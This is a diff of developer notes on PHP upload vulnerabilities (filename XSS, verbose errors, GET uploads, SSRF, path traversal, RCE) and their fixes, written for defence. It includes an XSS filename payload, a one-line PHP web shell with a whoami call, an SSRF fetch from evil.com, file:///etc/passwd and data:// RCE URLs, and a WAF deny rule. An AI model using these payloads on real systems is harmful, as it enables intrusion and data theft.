@@ -4,11 +4,9 @@ This is especially true if using PHP for file upload, although similar vulnerabi
 
 What is vulnerable on your local development may not on the server and vice versa. You want to check against the server. And when you migrate to another server, you need to that test that server as well. This depends on the vulnerability you patch of course (eg. file extension validation can happen at the code level and is independent of the OS)
 
-Fundamentals:
-- Separating into an upload form and upload endpoint still doesn't make you more secured: You could have a PHP upload form that both display the upload form as well as handle the uploads saving them to the server storage, or you could have the PHP upload form submit the files to another PHP endpoint. The hacker can still sniff the endpoint that the upload form requests to.
-- RCE stands for remote code execution. Remote code execution = hacker visits a script to run code. Usually this script has been forcefully placed into the server because of an exploit. That script could be php or whatever format that the server supports. The script usually has access to the system server files, eg. PHP by default can run shell scripts and access the storage. There are two types of RCE:
-	- Predefined RCE. You uploaded a php file that you can visit directly. Upon visiting the script, specific commands are run on the script's server. Those commands have been already coded into the uploaded script.
-	- Dynamic/Interactive RCE. You uploaded a php file that takes URL Search parameters. When visiting the script, you add the command as part of the URL. The commands run on the script's server.
+Required Knowledge:
+- Separating into an upload form and upload endpoint still doesn't make you more secured: You could have a PHP page that does it all (has upload form, displays the uploaded, and also handles the upload saving it to the server storage) - OR - You could have the PHP upload form submit the files to another PHP endpoint. The hacker can still sniff the endpoint that the upload form requests to. Then the hacker can send their own request and file to that endpoint. If it's an upload form that does it all, then based on the request header body, the hacker makes it act like it's receiving a file you just uploaded on their upload form.
+- Must know about RCE. Refer to [[Vocab - Remote Code Execution RCE - Predefined, Dynamic, Interactive]]
 
 Practice?
 - If don't have an upload form, you can play with this unsecured upload form in the same environment where you would have code at (Keep the url super secret and delete once done playing!): [[Mock Practice - Upload Form]]
@@ -21,12 +19,224 @@ Practice?
 
 ## List of Upload Vulnerabilities
 
+- Upload XSS via File Name
+- Upload Error with Verbose Messages
+- Upload with GET (Bad Practice)
+- Server-Side Request Forgery (SSRF)
 - Upload Arbitrary File Write with Path Traversal
 - Upload File Type Bypass RCE (Remote code execution)
 - Upload Unrestricted File Type RCE (Remote code execution)
-- Upload Error with Verbose Messages
-- Upload XSS via File Name
-- Server-Side Request Forgery (SSRF)
+
+### Upload XSS via File Name
+
+An attacker could upload a file named:
+```
+"><img src=x onerror=alert(1)>.jpg
+```
+
+If that hack is successful, then we can involve single quotes:
+```
+"><img src=x onerror=alert('Hacked')>.jpg
+```
+
+Always use `htmlspecialchars()` on the filename wherever it is echoed. And always use it before saving to the database. This ensures that if your app later displays the database entry on a newer designed page where you forget to escape the filename, it remains protected from XSS vulnerabilities. By escaping html special characters, you do not allow the hacker to introduce script blocks:
+
+Here’s what it does:
+
+```
+< becomes &lt;
+
+> becomes &gt;
+
+" becomes &quot;
+
+' becomes &#039;
+
+& becomes &amp;
+```
+
+You also need to decode any once encoded / double encoded / triple encoded code because hackers sometimes obscure the code in the url in order to bypass sanitation. Refer to the recursive decode until input value doesn't change code snippet at [[Sanitization of inputs (form inputs, url search param, etc)]]
+
+### Upload Error with Verbose Messages
+
+#### **Goal:** 
+Check if errors leak sensitive server info.
+
+#### How to test:  
+
+- Try uploading:
+	- A file larger than 5MB.
+	- A file with a forbidden extension (like `.exe`).
+	- Cause an intentional upload failure (kill your Wi-Fi mid-upload).
+
+#### What to look for:
+- If errors show **server paths**, **full PHP warnings**, or **raw error codes**, **they leak info to attackers**.
+
+### Upload with GET (Bad Practice)
+
+Using GET to upload content in PHP can lead to serious security vulnerabilities. Consider the following vulnerable code in `uploader.php`:
+
+```php
+file_put_contents('uploads/' . $_GET['filename'], $_GET['content']);
+```
+
+In this example, a hacker could exploit the endpoint to upload arbitrary code by sending a URL like:
+
+```
+https://example.com/uploader.php?filename=shell.php&content=<?php%20system($_GET['cmd']); ?>
+```
+
+This allows them to create a malicious PHP file (`shell.php`) that can execute system commands. For example, they could visit:
+
+```
+https://example.com/uploaded/shell.php?cmd=whoami
+```
+
+Once the malicious file is uploaded, the hacker can execute commands on the server, potentially revealing sensitive information like privileged usernames.
+
+In addition, the hacker may try to obscure the url by encoding or double encoding or triple encoding, so that it isn't clear there is code in the search param. More information at [[Sanitization of inputs (form inputs, url search param, etc)]]
+
+#### Solution:
+To prevent such attacks, **never use GET to handle file uploads**. Instead, use POST for file uploads, and always validate and sanitize file names and contents before saving them to the server.
+
+However if you MUST use GET, you have to sanitize by recursively decoding the search parameters ([[Sanitization of inputs (form inputs, url search param, etc)]]) and getting the basename then saving to only a specific folder.
+
+### Upload with GET - Server-Side Request Forgery (SSRF)
+
+Vulnerability index: [https://www.invicti.com/learn/server-side-request-forgery-ssrf/](https://www.invicti.com/learn/server-side-request-forgery-ssrf/)
+
+At the backend, `GET` is not meant for uploading files. But careless code can let an attacker _simulate_ a file upload by misusing URL parameters in a way that **writes to the filesystem**. See [Upload - Why POST with multipart form-data is safer than GET]
+
+This is what can happen as an External SSRF or an Internal SSFR:
+
+#### External SSRF
+
+External **SSRF (Server-Side Request Forgery)** occurs when an attacker manipulates a server into making an HTTP request to an external server that the attacker controls, often with the goal of exploiting vulnerabilities or gathering sensitive information. Mnemonic: The server is forged/tricked into making a request and the request comes from the victim's server, so it's a server-side request.
+
+uploader.php:
+```
+if (isset($_GET['upload_url'])) {  
+	$url = $_GET['upload_url'];  
+	$contents = file_get_contents($url);  
+	file_put_contents("uploaded/".basename($url), $contents);  
+}
+```
+
+Then hacker visits:
+https://yourdomain.com/uploader.php?upload_url=https://evil.com/shell.php
+
+Where the upload url is to their own server's shell.php that can take in shell commands (interactive RCE) or runs hard-coded shell commands (predefined RCE).
+
+PHP by default allows PHP functions to download remote files. The setting to override to "Off" in php.ini is `allow_url_fopen` which could enable/disable access to URL objects for `file_get_contents()`, `fopen()`, `include()`, and `require()`.
+
+#### Solutions to External SSRF:
+
+1. **Use POST for File Uploads**  
+    Always use `POST` with `multipart/form-data` for file uploads instead of `GET`. This ensures that file content is handled securely, without misusing URL parameters.
+    
+2. Decode recursively
+   URL may be encoded once/twice/thrice/etc. The `file_get_contents` etc works with these encoded URLs but regular expression matching (later in this solution) won't. Refer to recursive decoding at [[Sanitization of inputs (form inputs, url search param, etc)]]
+
+3. **Block URLs with Regex**  
+    Use a simple regular expression to block any URLs from being passed as parameters. This helps ensure that no URL can be used for SSRF or other malicious purposes.
+    
+    ```php
+    if (preg_match('/https?:\/\/[^\s]+/', $_GET['upload_url'])) {
+        die('Invalid URL.');
+    }
+    ```
+    
+4. **Disable Remote File Access in `php.ini`**  
+    Ensure that `allow_url_fopen` is set to `Off` in your `php.ini` configuration to prevent PHP functions like `file_get_contents()` from accessing remote files.
+    
+    ```
+    allow_url_fopen = Off
+    ```
+
+#### Internal SSRF
+
+Internal **SSRF (Server-Side Request Forgery)** occurs when an attacker manipulates a server into making an HTTP request to internal resources such as at localhots or 127.0.0.1.
+
+If your server fetches the URL specified by `upload_url`, an attacker could supply:
+`https://yourdomain.com/uploader.php?upload_url=http://127.0.0.1/admin_panel`
+
+Or:
+`https://yourdomain.com/uploader.php?upload_url=http://localhost:8080/internal_api`
+
+In this case, even though these URLs are not accessible externally, **your server** might still be able to access them because it’s making the request internally. This could expose sensitive internal systems or APIs that would normally be behind a firewall or not directly exposed to the public.
+
+So even if the firewall cli blocked the port access from the internet, now it got worked around.
+
+Another internal ssrf vector is the `file://` scheme:
+- The `file://` protocol allows access to files on the local file system, which can be exploited in SSRF attacks to read sensitive files.
+- Example: An attacker might try to access system files like `/etc/passwd` on Linux or `C:\Windows\System32\config\` on Windows by manipulating a URL to something like `file:///etc/passwd`.
+- If the server follows a user-provided URL and fetches local files, it could expose sensitive information or configuration files to an attacker.
+- For example:
+```
+http://yourserver.com/uploader.php?file=file:///etc/passwd
+```
+
+And another internal ssrf vector is the `data://` scheme:
+- The `data://` protocol allows embedding small files or data directly into a URL in base64-encoded format. While often used for embedding data into web applications, it can also be misused for SSRF attacks.
+- Attackers could use `data://` to execute code or inject malicious payloads, leading to various security vulnerabilities.
+- If the server processes this as a valid file and executes it, it could run arbitrary code on the server, leading to remote code execution (RCE):
+```
+http://yourserver.com/uploader.php?file=data:text/plain;base64,<?php echo system('whoami'); ?>
+```
+
+#### Solutions to Internal SSRF:
+- Recursively decode the input value in case hacker is obscuring with encoding once/twice/thrice/etc. Refer to [[Sanitization of inputs (form inputs, url search param, etc)]]
+- THEN block access to localhost and internal IP addresses. For example, php:
+```
+$blocked_ips = ['127.0.0.1', 'localhost', '::1', '10.0.0.0', '192.168.0.0', '169.254.0.0'];
+$parsed_url = parse_url($url);
+$host = $parsed_url['host'];
+
+if (in_array($host, $blocked_ips)) {
+    die('Access to internal IP addresses or localhost is blocked.');
+}
+```
+- OR THEN implement strict URL whitelisting to ensure requests are only made to trusted resources. For example, php:
+```
+$allowed_domains = ['trusted.com', 'api.yourdomain.com'];
+$parsed_url = parse_url($url);
+$host = $parsed_url['host'];
+
+if (!in_array($host, $allowed_domains)) {
+    die('URL not allowed.');
+}
+```
+- Validate and sanitize user inputs to prevent attackers from exploiting any SSRF vectors. For example, php:
+```
+function sanitize_url($url) {
+    // Remove invalid characters and schemes like 'file://' or 'data://'
+    $url = filter_var($url, FILTER_SANITIZE_URL);
+    
+    if (!filter_var($url, FILTER_VALIDATE_URL)) {
+        die('Invalid URL.');
+    }
+
+    // Check if the URL scheme is valid
+    $parsed_url = parse_url($url);
+    if (!in_array($parsed_url['scheme'], ['http', 'https'])) {
+        die('Invalid URL scheme.');
+    }
+
+    return $url;
+}
+
+```
+- Use WAFs which will detect SSRF attempts.
+	- Configure your Web Application Firewall (WAF) to block common SSRF attack patterns. WAFs can detect malicious URL patterns, blocked IPs, or suspicious user input in HTTP requests.
+	- **OWASP ModSecurity CRS (Core Rule Set)**: You can configure ModSecurity (WAF) with CRS to block SSRF attacks.
+	- **Example WAF Rule:**
+	```
+	 `SecRule REQUEST_URI "@rx (localhost|127\.0\.0\.1|0\.0\.0\.0|169\.254)" "id:100000,deny,log,msg:'SSRF attempt blocked'"
+	```
+    
+	^ This rule blocks requests attempting to access `localhost`, `127.0.0.1`, or other reserved IPs.
+
+---
 
 ### Upload Arbitrary File Write with Path Traversal
 
@@ -51,10 +261,13 @@ If the hacker is familiar with your system, the hacker could path traversal into
 - For example `/app/config/initializers/malicious.rb`  would autostart a bad ruby script, and ruby has access to your server storage and shell
   
 #### **How prevent:**
-Use basename() in PHP to extract only the filename:
-```
-$safeName = basename($_FILES['file']['name']);
-```
+You could use regular expression to match for zero or more `../` and remove them, but keep in mind that encode and double encode has to be considered, and so does the permutations of mixing encoded and non-encoded characters (not to mention potentially mixing double encoded characters too) in the hacker's effort to bypass your validation. 
+
+Use the script to recursively decode the input until it no longer changes, found in [[Sanitization of inputs (form inputs, url search param, etc)]].
+
+Then you may use regular expression to remove zero or more `../` - OR - simply use basename() in PHP to extract only the filename `$safeName = basename($_FILES['file']['name']);` then placing into the appropriate uploaded folder.
+
+This validation needs to be done at both frontend as well as backend.
 
 ---
 
@@ -77,9 +290,10 @@ See if you can upload an **executable script** disguised as a safe file.
 ![[Pasted image 20250507205336.png]]
 #### **How to fix or avoid:**
 You could fix in various ways. 
-- One way is to have regular expression match then change all periods to hyphen except the final period (since that's the file extension). 
+- One way is to have regular expression match then change all periods to hyphen except the final period (since that's the file extension). This needs to be done at both frontend and backend (so the hacker can't just target the backend with their own file and request after sniffing what the upload endpoint is.)
+	- BUT - the user could have encoded once/twice/thrice/etc especially on the period (.), so recursively decode first:  [[Sanitization of inputs (form inputs, url search param, etc)]].
 - Another way is to enforce strict file extension and MIME types. 
-- Another way is to restrict all uploads to one folder by getting only basename, and also restricting that folder chmod from execution and in apache or nginx you can disable php execution in that folder.
+- Another way is to disable php execution in the uploads folder, and then get only basename from the user upload and place the upload only in that uploads folder.
 
 
 ### Upload Unrestricted File Type RCE (Remote code execution)
@@ -186,75 +400,7 @@ But some setups may detect that:
 
 Block php uploads. Or only whitelist acceptable file formats. Go even further: Rename files to hashed filename if your app won't break from that (so hacker bots can't automate hack attempts uploading then visiting an uploaded file with the expected same filename).
 
-When you restrict filetype by validating against them, make sure to restrict in **both frontend and backend**. For file extensions to blacklist or whitelist, refer to [[File extensions to blacklist or whitelist]].
-
-### Upload Error with Verbose Messages
-
-#### **Goal:** 
-Check if errors leak sensitive server info.
-
-#### How to test:  
-
-- Try uploading:
-	- A file larger than 5MB.
-	- A file with a forbidden extension (like `.exe`).
-	- Cause an intentional upload failure (kill your Wi-Fi mid-upload).
-
-#### What to look for:
-- If errors show **server paths**, **full PHP warnings**, or **raw error codes**, **they leak info to attackers**.
-
-### Upload XSS via File Name
-
-An attacker could upload a file named:
-```
-"><img src=x onerror=alert(1)>.jpg
-```
-
-If that hack is successful, then we can involve single quotes:
-```
-"><img src=x onerror=alert('Hacked')>.jpg
-```
-
-While you `htmlspecialchars()` the name, always be sure it’s applied everywhere the filename is echoed.
-
-
-### Server-Side Request Forgery (SSRF)
-
-Vulnerability index: [https://www.invicti.com/learn/server-side-request-forgery-ssrf/](https://www.invicti.com/learn/server-side-request-forgery-ssrf/)
-
-At the backend, `GET` is not meant for uploading files. But careless code can let an attacker _simulate_ a file upload by misusing URL parameters in a way that **writes to the filesystem**. See [Upload - Why POST with multipart form-data is safer than GET]
-
-This is what can happen:
-
-uploader.php:
-```
-if (isset($_GET['upload_url'])) {  
-	$url = $_GET['upload_url'];  
-	$contents = file_get_contents($url);  
-	file_put_contents("uploaded/".basename($url), $contents);  
-}
-```
-
-Then hacker visits:
-https://yourdomain.com/uploader.php?upload_url=https://evil.com/shell.php
-
-Where the upload url is to their own server's shell.php that can take in shell commands (interactive RCE) or runs hard-coded shell commands (predefined RCE).
-
-PHP by default allows PHP functions to download remote files. The setting to override to "Off" in php.ini is `allow_url_fopen` which could enable/disable access to URL objects for `file_get_contents()`, `fopen()`, `include()`, and `require()`.
-
-Another thing that can happen. Let's say `uploader.php` is:
-```
-file_put_contents('uploads/' . $_GET['filename'], $_GET['content']);
-```
-
-Then the hacker could visit this endpoint to upload inline code into a php executable file:
-```
-https://example.com/uploader.php?filename=shell.php&content=<?php%20system($_GET['cmd']); ?>
-```
-
-Then the hacker visits https://example.com/uploaded/shell.php?cmd=whoami or whatever the url for any downloads is (for example, if uploaded an image and the website previews that image, then the hacker can inspect for the uploaded folder path). Boom - in this case, a privileged username appears. 
-
----
+When you restrict filetype by validating against them, make sure to restrict in **both frontend and backend**. Same principles about the hacker sniffing the upload endpoint and requesting directly to that upload endpoint applies. For file extensions to blacklist or whitelist, refer to [[File extensions to blacklist or whitelist]].
 
 ## Highlights
 
